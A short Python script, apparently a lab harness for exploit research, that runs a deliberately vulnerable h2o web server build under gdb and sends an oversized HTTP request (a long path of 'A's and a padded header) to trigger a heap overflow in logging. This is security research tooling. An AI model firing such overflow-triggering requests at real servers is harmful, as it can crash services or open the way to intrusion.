#!/usr/bin/env python3
"""Throwaway: gdb-inspect the forced-heap log line overflow on the pinned plain build."""
import os
import socket
import subprocess
import sys
import time
import urllib.request

ROOT = "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell"
PORT = 17999
header_len = int(sys.argv[1]) if len(sys.argv) > 1 else 1200
path_len = int(sys.argv[2]) if len(sys.argv) > 2 else 8100

proc = subprocess.Popen(
    ["gdb", "-q", "-batch", "-x", f"{ROOT}/live/forced-heap.gdb", "--args",
     f"{ROOT}/src/vuln/build-plain/h2o", "-c", f"{ROOT}/live/forced-heap.conf"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
)
for _ in range(100):
    try:
        s = socket.create_connection(("127.0.0.1", PORT), 0.2)
        s.close()
        break
    except OSError:
        time.sleep(0.1)
else:
    print("SERVER_NOT_READY")
req = urllib.request.Request(f"http://127.0.0.1:{PORT}/" + "A" * path_len,
                             headers={"pad": "B" * header_len})
try:
    with urllib.request.urlopen(req, timeout=15) as r:
        print("HTTP", r.status)
except Exception as e:
    print("REQUEST_FAILED", repr(e))
try:
    out, _ = proc.communicate(timeout=30)
except subprocess.TimeoutExpired:
    proc.kill()
    out, _ = proc.communicate()
print(out)
